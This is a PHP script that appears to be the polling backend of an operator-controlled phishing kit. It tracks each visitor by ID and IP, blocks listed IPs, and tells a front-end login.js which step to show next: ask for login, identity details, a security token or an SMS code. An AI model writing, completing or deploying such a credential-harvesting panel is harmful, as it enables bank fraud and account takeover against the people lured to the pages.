<?php
header('Content-Type: application/json');
require_once __DIR__ . '/helpers.php';

$response = ['status' => 'ok', 'action' => 'none'];
$userIp = getUserIP();
$pdo = getDB();

if (!$pdo) {
    echo json_encode(['status' => 'error', 'action' => 'none', 'msg' => 'DB connection failed']);
    exit;
}

// 1. Verificar si la IP está bloqueada en la base de datos
try {
    $stmt = $pdo->prepare("SELECT 1 FROM bloqueos WHERE ip = ?");
    $stmt->execute([$userIp]);
    if ($stmt->fetch()) {
        echo json_encode(['status' => 'blocked', 'action' => 'blocked']);
        exit;
    }
} catch (Exception $e) {
    // Si falla la consulta (ej. tabla no existe aún), ignoramos para no romper el flujo
}

// 2. Obtener el ID del visitante (priorizando el que viene por URL de login.js)
$id = $_GET['id'] ?? $_SESSION['visitor_id'] ?? getVisitorId();

// Guardamos el ID en sesión para mantener consistencia si recarga la página
$_SESSION['visitor_id'] = $id;

// 3. Buscar el estado actual del usuario en la base de datos
$stmt = $pdo->prepare("SELECT status FROM registros WHERE id = ?");
$stmt->execute([$id]);
$row = $stmt->fetch(PDO::FETCH_ASSOC);

if ($row) {
    // 4. Actualizar la última conexión (last_seen) y la IP real
    $updateStmt = $pdo->prepare("UPDATE registros SET last_seen = ?, ip = ? WHERE id = ?");
    $updateStmt->execute([time(), $userIp, $id]);

    $currentStatus = $row['status'] ?? 'Nuevo';
    
    // Mapeo de estados a acciones para el frontend (login.js)
    $actionsMap = [
        'pedir_login' => 'pedir_login',
        'pedir_identidad' => 'pedir_identidad',
        'pedir_token' => 'pedir_token',
        'pedir_sms' => 'pedir_token', // Redirige a seguridad.php
        'finished' => 'finished',
        'blocked' => 'blocked'
    ];

    $response['status'] = $currentStatus;
    $response['action'] = $actionsMap[$currentStatus] ?? 'none';
}

echo json_encode($response);
exit;
?>
